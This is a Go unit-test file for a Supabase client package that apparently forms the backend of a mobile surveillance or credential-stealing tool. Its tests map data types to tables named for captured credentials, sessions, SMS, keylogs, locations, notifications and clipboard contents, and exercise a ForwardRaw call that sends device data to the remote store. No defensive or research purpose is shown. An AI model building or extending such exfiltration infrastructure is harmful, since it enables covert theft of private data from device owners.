package supabase

import (
	"testing"
)

func TestNewClient(t *testing.T) {
	c := New("https://test.supabase.co", "test-key")
	if c == nil {
		t.Fatal("client should not be nil")
	}
	if c.baseURL != "https://test.supabase.co" {
		t.Errorf("expected baseURL https://test.supabase.co, got %s", c.baseURL)
	}
	if c.serviceKey != "test-key" {
		t.Errorf("expected serviceKey test-key, got %s", c.serviceKey)
	}
}

func TestDataTypeTableMapping(t *testing.T) {
	tests := []struct {
		dataType string
		want     string
		has      bool
	}{
		{"credential", "captured_mobile_credentials", true},
		{"session", "captured_mobile_sessions", true},
		{"file", "captured_mobile_files", true},
		{"sms", "captured_mobile_sms", true},
		{"keylog", "captured_mobile_keylogs", true},
		{"location", "captured_locations", true},
		{"notification", "captured_notifications", true},
		{"clipboard", "captured_clipboard", true},
		{"unknown", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.dataType, func(t *testing.T) {
			table, ok := dataTypeToTable[tt.dataType]
			if ok != tt.has {
				t.Errorf("expected has=%v, got has=%v for %s", tt.has, ok, tt.dataType)
			}
			if ok && table != tt.want {
				t.Errorf("expected table %s, got %s for %s", tt.want, table, tt.dataType)
			}
		})
	}
}

func TestDataForwardPayload(t *testing.T) {
	client := New("https://test.supabase.co", "test-key")

	// This should not panic
	err := client.ForwardRaw("test_table", map[string]interface{}{
		"device_id": "test-device",
		"data":      "test",
	})

	// We expect an error since this is a fake URL, not a panic
	if err == nil {
		t.Log("expected connection error (not a failure)")
	}
}

func TestHealthCheck(t *testing.T) {
	client := New("https://test.supabase.co", "test-key")

	// We expect this to return false since the URL is fake
	if client.HealthCheck() {
		t.Log("expected health check to return false for fake URL")
	}
}
